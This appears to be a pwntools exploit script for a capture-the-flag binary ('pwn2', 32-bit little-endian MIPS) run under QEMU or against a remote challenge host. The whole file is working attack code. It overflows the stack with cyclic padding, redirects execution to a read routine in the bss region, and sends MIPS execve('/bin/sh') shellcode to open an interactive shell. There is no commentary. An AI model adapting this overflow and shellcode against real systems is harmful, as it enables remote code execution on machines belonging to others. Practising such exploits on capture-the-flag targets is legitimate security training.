from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",26964]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    # context.log_level="debug" 
    #io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    # io = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    # io = process(["qemu-mipsel-static", "-g", "1234","-L",".","./pwn2"]) 
    io = process(["qemu-mipsel-static", "-g", "1234","./pwn2"]) 
    # io = process("")
    context(log_level='debug',arch='mips',endian='little', os='linux',bits='32')
    # context.terminal['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        context(arch='mips',endian='little', os='linux',bits='32')
        io = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
        
        
bss_addr=0x411700
read_text=0x400f50


io.sendafter(b"here:\n",b"aaa")
io.recv()
io.sendline(b"7")

#payload=cyclic(0x200)
#offset 60

payload=cyclic(56)+p32(bss_addr)+p32(read_text)
io.sendafter(b"feeling:\n",payload)

shellcode=b"\xff\xff\x10\x04\xab\x0f\x02\x24"
shellcode+=b"\x55\xf0\x46\x20\x66\x06\xff\x23"
shellcode+=b"\xc2\xf9\xec\x23\x66\x06\xbd\x23"
shellcode+=b"\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
shellcode+=b"\x9a\xf9\xbd\x23\x21\x20\x80\x01"
shellcode+=b"\x21\x28\xa0\x03\xcc\xcd\x44\x03"
shellcode+=b"/bin/sh"

payload=b"a"*60+p32(bss_addr+88)+shellcode

io.send(payload)

io.interactive()